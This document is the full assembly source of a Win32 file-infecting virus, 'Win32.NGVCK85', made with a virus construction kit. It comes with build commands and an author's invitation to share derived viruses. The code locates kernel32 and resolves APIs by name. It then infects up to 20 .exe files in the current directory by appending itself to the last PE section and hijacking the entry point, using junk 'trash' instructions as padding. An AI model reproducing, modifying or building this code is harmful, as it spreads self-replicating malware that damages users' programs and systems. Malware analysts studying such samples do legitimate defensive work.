              
;
;
; Win32.NGVCK85 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK85
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 51
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebx
                                        ; mov ebp, ebx
                                        ; clear ebp
 sub ebp, ebp
 add ebp, ebx
 sub ebp, offset Delta
 jmp KernelSearchStart
 neg ebx                                ; Trash


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear eax
 xor eax, eax

 push eax
 push eax
 push 3h
 push eax
                                        ; add eax, 1
 add eax, 1d
 push eax
 mov eax, 80000000h or 40000000h
 push eax
 mov ebx, offset WFD_szFileName
 add ebx, ebp

 push ebx
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 push 0
 push edx
 push 0
                                        ; mov ecx, 4
 push 4d
 pop ecx
 push ecx
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 add dword ptr [ebp+MapHandle], eax
 pop edx
 test eax, eax
 jz CloseFile
 push edx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 add eax, 1d
 sub eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ecx
 push ecx
                                        ; round to pages
 shr ecx, 16d
 rol ecx, 16d
                                        ; add ecx, 1
 inc ecx
GetKernelLoop:
                                        ; clear ebx
 mov ebx, 16047d
 sub ebx, 16047d
 add ecx, -1
 mov bx, word ptr [ecx+03ch]
 test bx,0f800h
 jnz GetKernelLoop
 cmp ecx, dword ptr [ecx+ebx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], ecx
 mov ebx, [ecx+3Ch]
 add ebx, ecx
 mov [KernelPE+ebp], ebx

 mov ebx, ebp
 add ebx, offset GetApis

 push ebx
ret

;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear edx
 mov edx, -50539d
 add edx, 50539d
 add edx, dword ptr [ebp+MapAddress]
 ror eax, 3d                            ; Trash
                                        ; retrieve PE - Header
 mov ecx, [edx+3Ch]
 add ecx, edx
                                        ; get File Alignment
 mov eax, [ecx+3Ch]
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], eax
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], edx
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], edx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ecx, esi
 add ecx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 mov esi, ecx
 sbb ebx, 5d                            ; Trash
                                        ; get last section
 movzx eax, word ptr [esi+06h]
 add eax, -1
 imul eax, eax, 28h
 add ecx, eax
                                        ; add ecx, 120
 add ecx, 120d
                                        ; clear edx
 push 0
 pop edx
 add edx, dword ptr [esi+74h]
 shl edx, 3
 add ecx, edx
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], eax
 mov eax, dword ptr [esi+34h]
 push eax
 pop dword ptr [ebp+OldBase]
                                        ; clear eax
 push 0
 pop eax

 add eax, [ecx+10h]
                                        ; mov edx, eax
 mov edx, eax
 add ecx, 14h
 add eax, [ecx]
 sub ecx, 14h
 push eax
 mov ebx, edx
 dec dword ptr [ebp+Trash1]             ; Trash
 add ebx, [ecx+0Ch]
 push ebx
 pop dword ptr [ebp+NewEIP]
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], ebx
 mov ebx, [ecx+10h]
 push ebx
                                        ; calculate new section size
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], ebx
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
                                        ; clear ebx
 sub ebx, ebx
 xor ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ecx+10h], 0h
 add dword ptr [ecx+10h], ebx
 pop ebx
 add ebx, VirusSize
 mov dword ptr [ecx+08h], 0
 add dword ptr [ecx+08h], ebx
 mov ebx, dword ptr [ecx+0Ch]
 add ebx, dword ptr [ecx+10h]
 mov dword ptr [esi+50h], ebx
                                        ; set write, read and code flag
 or dword ptr [ecx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 mov edx, VirusSize
 mov esi, offset Virus
 add esi, ebp

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 dec ecx
 mov dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldEIP]

 push edx
 pop dword ptr [ebp+retEIP]

 push dword ptr [ebp+OldBase]
 pop edx

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], edx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov edx,12345678h
 org $-4
 retEIP dd 0h
 add edx,12345678h
 org $-4
 retBase dd 0h
 jmp edx



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

 mov esi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear edx
 mov edx, -62365d
 add edx, 62365d
 add edx, [esi+78h]
 add edx, [ebp+KernelMZ]
                                        ; add edx, 28
 inc edx
 add edx, 27d
                                        ; get ATableVA
 mov esi, dword ptr [edx]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], esi
                                        ; add edx, 4
 dec edx
 add edx, 5d
                                        ; get NTableVA
 mov esi, dword ptr [edx]
                                        ; add edx, 4
 inc edx
 add edx, 3d
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], esi
                                        ; get OTableVA
 mov esi, dword ptr [edx]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], esi
                                        ; number of API's we're looking for
 push NumberOfApis
 pop ecx

                                        ; load API Names and Offsets
 lea edx, [ebp+APIOffsets]
 xchg edx, edi

 mov ebx, offset APINames
 add ebx, ebp


GetApisLoop: 
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 mov eax, ebx
APINameDetect:                          ; calculate the lenght of the names
 add eax, 1d
 cmp byte ptr [eax], 0
 jne APINameDetect

 push eax
 sub dword ptr [esp], ebx
 pop eax
                                        ; search 'em
                                        ; eax contains Name-Lenght
                                        ; ebx points to the Name
                                        ; edi points to the offset

 call SearchAPI1
                                        ; add ebx, 1
 inc ebx
 push ebx
 add dword ptr [esp], eax
 pop ebx
                                        ; mov edx, -1
 mov edx, ( -1d xor 37d )
 xor edx, 37d
 and edx, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], -1
 and dword ptr [edi], edx
                                        ; add edi, 4
 inc edi
 add edi, 3d
 loop GetApisLoop
 mov edi, ebp
 add edi, offset Outbreak

 push edi
 adc ebx, 34476937d                     ; Trash
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Lenght of API-Name
                                        ; ebx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov ecx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ecx
 mov edx, dword ptr [ecx]
 add edx, [ebp+KernelMZ]
                                        ; mov ecx, edx
                                        ; clear ecx
 and ecx, 0
 add ecx, edx
                                        ; mov esi, edx
 push edx
 pop esi
 push eax
 push esi
 push ebx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov dl, byte ptr [esi]
 cmp dl, byte ptr [ebx]
 jne ApiNotFound
 sub eax, 1
 or eax, eax
 jz FoundApi1
                                        ; add ebx, 1
 inc ebx
                                        ; add esi, 1
 inc esi
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop ebx
 pop esi
 pop eax
 pop ecx
                                        ; add ecx, 4
 add ecx, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 16d
                                        ; retrieve the offset
                                        ; clear ecx
 push 0
 pop ecx
 mov cx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 push ecx
 pop edi
                                        ; clear ecx
 mov ecx, 20007d
 sub ecx, 20007d
 mov cx, word ptr [edi]
 clc
 rcl ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [ecx]
 add edx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov eax, offset WIN32_FIND_DATA
 add eax, ebp

 push eax
                                        ; clear ebx
 sub ebx, ebx
 xor ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg ebx, edx

 push edx
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov edx, 276
 mov edx, ( 276d + 20d )
 sub edx, 20d
 lea eax, [ebp+WFD_szFileName]
 xchg edi, eax


ClearOldData2:
 mov byte ptr [edi], 0h
                                        ; add edi, 1
 inc edi
 dec edx
 jnz ClearOldData2
 popad
ret





;                  [ ///// * Data * \\\\\ ]

Data:
 ATableVA    dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 filemask    db '*.ExE',0
 NewEIP      dd 0h
 counter     dw 0h
 KernelPE    dd 0h
 TempAPI     dd 0h
 MapAddress  dd 0h
 AlignReg1   dd 0h
 KernelMZ    dd 0h
 db 'Win32.NGVCK85 - SnakeByte',0
 OldEIP      dd 0h

 APIOffsets:
 XCloseHandle           dd 0h
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XFindFirstFileA        dd 0h
 XMapViewOfFile         dd 0h
 XFindNextFileA         dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileMappingA    dd 0h

 FindHandle  dd 0h
 MapHandle   dd 0h
 OTableVA    dd 0h
 Trash1      dd 0h
 InfCounter  dd 0h
 NewSize     dd 0h

 APINames:
 db 'CloseHandle', 0
 db 'CreateFileA', 0
 db 'FindClose', 0
 db 'FindFirstFileA', 0
 db 'MapViewOfFile', 0
 db 'FindNextFileA', 0
 db 'UnmapViewOfFile', 0
 db 'CreateFileMappingA', 0

 AlignReg2   dd 0h
 NTableVA    dd 0h
 FileHandle  dd 0h
 OldBase     dd 400000h




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 and edx, 0
 push eax
 div ecx
 sub ecx, edx
 pop eax
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ecx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; mov ecx, -1
 mov ecx, 0
 add ecx, -1d
 and ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
 neg edx                                ; Trash
 cmp word ptr [ecx+3Ch], 0h
 je Notagoodfile
 mov ebx, dword ptr [ecx+3Ch]
                                        ; check if header lies inside the file
 cmp ebx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add ebx, ecx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ebx], 'EP'
 je Goodfile2
                                        ; clear eax
 push 0
 pop eax
                                        ; add eax, 1
 sub eax, -1d
 sub eax, 1
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ebx+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov ax, word ptr [ebx+16h]
 and ax, 00002h
 cmp ax, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov ax, word ptr [ebx+16h]
 and ax, 0F000h
 cmp ax, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], ebx

                                        ; clear ebx
 and ebx, 0
 add ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 add dword ptr [ebp+retBase], ebx




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
                                        ; mov eax, 20
 push 20d
 pop eax
 mov dword ptr [ebp+InfCounter], eax
 lea edi, [ebp+filemask]

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 test eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 add edx, -1
 inc edx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov edi, dword ptr [ebp+FindHandle]
 push edi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ebx
 xor ebx, ebx
 push ebx
 call ExitProcess



end FakeCode

